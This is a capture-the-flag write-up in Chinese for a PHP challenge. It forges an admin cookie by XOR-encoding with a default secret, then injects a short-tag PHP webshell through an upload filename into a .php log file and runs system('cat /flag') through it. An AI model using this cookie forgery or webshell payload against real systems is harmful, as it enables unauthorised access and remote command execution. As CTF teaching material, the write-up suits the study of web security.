# C15

用户名是Cookie存在客户端的，所以可以Cookie伪造，在`function.php`内有Cookie加密解密的相关逻辑

`user.php`只有用户登陆的逻辑代码，但没有注册逻辑代码，因此只能通过Cookie伪造来登陆admin用户

`image.php`原本应该是用来SQL注入来达到获取`secret`从而伪造Cookie，但是本题目直接给了源代码，猜测`config.php`内的`secret`并没有修改，所以可以先使用源码的`secret`伪造尝试

```php
function encode($str,$key)
{
    $tmp="";
    for ($i=0;$i<strlen($str);$i++)
    {
        $tmp .= chr(ord($str[$i])^ord($key[$i%strlen($key)]));
    }
    return base64_encode($tmp);
}
echo encode('admin','!*(fp60zoy');
// QE5FDx4=
```

```
Cookie: username=QE5FDx4=
```

这样我们直接带上这个Cookie去请求`user.php`，可以看到已经是admin用户了。

这里有个上传接口，但是并没有上传文件的逻辑。但是存在写日志的逻辑

```php
$file_name=$_FILES["file"]["name"];

if (preg_match("/php/i",$file_name))
{
    echo "You cant upload php file.<script>setTimeout('location.href=\"user.php\"',3000);</script>";
    die;
}

file_put_contents("logs/upload.log.php","User {$username} uploaded file {$file_name}.\n",FILE_APPEND);
```

可以看到日志文件是php文件，这样我们只要在文件名中包含php一句话就可以了

由于有正则表达式限制，我们可以使用php短标签来绕过

payload

```
<?=eval($_GET[x]);?>
```

然后直接访问`/logs/upload.log.php?x=system('cat /flag');`，拿到flag
